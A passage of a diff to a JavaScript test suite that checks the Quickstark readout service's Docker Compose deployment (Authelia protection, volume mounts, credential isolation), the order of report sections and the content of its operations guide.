   assert.match(compose, /\/docker\/appdata\/quickstark-readouts:\/docker\/appdata\/quickstark-readouts:rw/);
   assert.match(compose, /\/docker\/appdata\/quickstark-readouts-config:\/run\/quickstark:ro/);
   assert.doesNotMatch(compose, /readout-producers\.json:\/run\/quickstark\/readout-producers\.json:ro/);
-  assert.doesNotMatch(compose, /quickstark-readouts-credentials/);
+  assert.doesNotMatch(viewer, /quickstark-readouts-credentials/);
+  assert.doesNotMatch(ingestion, /quickstark-readouts-credentials/);
+  assert.match(settings, /quickstark-readouts-credentials/);
+  assert.match(settings, /quickstark-readouts-config:\/run\/quickstark-config:rw/);
+  assert.match(settings, /traefik\.http\.routers\.quickstark-readout-settings\.middlewares=authelia@file/);
+  assert.match(settings, /QS_READOUT_SETTINGS_ADMIN_GROUPS:\s*admins/);
+  assert.doesNotMatch(settings, /\/docker\/appdata\/quickstark-readouts:\/docker\/appdata\/quickstark-readouts/);
   assert.match(compose, /traefik\.http\.routers\.quickstark-readouts\.middlewares=authelia@file/);
   assert.match(compose, /\/docker\/appdata\/quickstark-readouts:\/docker\/appdata\/quickstark-readouts:ro/);
   assert.doesNotMatch(compose, /^\s*ports:/m);
@@ -1750,7 +2535,7 @@ test("every promoted skill has its own complete, purpose-specific visual report 
   }
 });
 
-test("actual skill reports automatically identify the actual execution machine near the top", () => {
+test("actual skill reports identify the actual execution machine after top next prompts", () => {
   for (const skill of SKILLS) {
     const input = {
       skill: skill.name,
@@ -1765,8 +2550,8 @@ test("actual skill reports automatically identify the actual execution machine n
     assert.ok(html.includes(hostname()), `${skill.name} omits its actual execution machine`);
     assert.ok(html.includes(`<meta name="quickstark:machine" content="${hostname()}">`));
     assert.ok(
-      html.indexOf("Execution context") < html.indexOf("Top next prompts"),
-      `${skill.name} hides the execution machine below the completion summary`,
+      html.indexOf("Top next prompts") < html.indexOf("Execution context"),
+      `${skill.name} must show its top next prompts before execution context`,
     );
   }
 });
@@ -1793,7 +2578,10 @@ test("deployment reports prominently identify only verified deployment environme
   assert.ok(html.includes(url));
   assert.match(html, /Authelia protects the production report viewer/);
   assert.match(html, /<meta name="quickstark:deployment-url"/);
-  assert.ok(html.indexOf("Verified deployment · production") < html.indexOf("Top next prompts"));
+  assert.ok(
+    html.indexOf("Top next prompts") < html.indexOf("Verified deployment · production"),
+    "top next prompts remain visible before verified deployment evidence",
+  );
 });
 
 test("architecture, module, implementation, and documentation reports foreground actual changed files", () => {
@@ -2044,8 +2832,9 @@ test("GitHub-facing reports prominently preserve verified release, issue, PR, an
   assert.match(html, /quickstark:release-version/);
   assert.match(html, /quickstark:commit-sha/);
   assert.ok(
-    html.indexOf("Verified delivery evidence") < html.indexOf("Top next prompts"),
-    "Verified delivery evidence should appear before follow-on recommendations.",
+    html.indexOf("<h2>Top next prompts</h2>")
+      < html.indexOf("<h2>Verified delivery evidence</h2>"),
+    "top next prompts remain visible before verified delivery evidence",
   );
 });
 
@@ -3671,7 +4460,10 @@ test("the hosted deployment attaches Authelia and exposes no direct container or
   assert.match(compose, /traefik\.http\.routers\.quickstark-readouts\.middlewares=authelia@file/);
   assert.match(compose, /traefik\.http\.services\.quickstark-readouts\.loadbalancer\.server\.port=4173/);
   assert.match(compose, /QS_READOUT_PUBLICATION_MODE:\s*hosted/);
-  assert.match(compose, /QS_READOUT_ALLOWED_PROJECTS:\s*github\.com\/quickstark\/skills/);
+  assert.match(
+    compose,
+    /QS_READOUT_ALLOWED_PROJECTS:\s*["']\*["']/,
+  );
   assert.match(compose, /QS_READOUT_CURRENT_PROJECT:\s*github\.com\/quickstark\/skills/);
   assert.match(compose, /QS_READOUT_TRUSTED_PROXY:\s*["']?true/);
   assert.match(compose, /working_dir:\s*\/opt\/quickstark/);
@@ -4175,8 +4967,11 @@ test("project guides document actual skill sources, secure readout boundaries, a
   assert.match(operations, /reports\.quickstark\.com/);
   assert.match(operations, /api\/v1\/readouts/);
   assert.match(operations, /QS_READOUT_PRODUCER_TOKEN/);
-  assert.match(operations, /QS_READOUT_PUBLISH_PROJECTS/);
-  assert.match(operations, /QS_READOUT_INGESTION_URL/);
+  assert.match(operations, /only required setting/i);
+  assert.match(operations, /current working directory/i);
+  assert.match(operations, /(?:without|no).{0,40}(?:Git|remote)|(?:Git|remote).{0,40}(?:available|optional)/i);
+  assert.match(operations, /Skill run metrics/);
+  assert.doesNotMatch(operations, /export QS_READOUT_(?:PUBLISH_PROJECTS|INGESTION_URL|PRODUCER_ID|HARNESS)/);
   assert.match(operations, /\b401\b/);
   assert.match(operations, /\b409\b/);
   assert.match(operations, /rotation|rotate|revocation/i);
@@ -4362,9 +5157,10 @@ test("the Codex package is a curated, Codex-compatible snapshot of the canonical
   }
 });
 
-test("installed Codex skills receive the exact canonical catalog, report presentation module, and HTML readout helper", async () => {
+test("installed Codex skills receive the exact canonical catalog, portfolio, report presentation module, and HTML readout helper", async () => {
   const packagedSupport = join(repositoryRoot, "codex", "plugins", "qs-skills", "scripts");
   const expected = [
+    "qs-readout-portfolio.mjs",
     "qs-skill-catalog.mjs",
     "qs-skill-report-presentation.mjs",
     "qs-skill-readout.mjs",
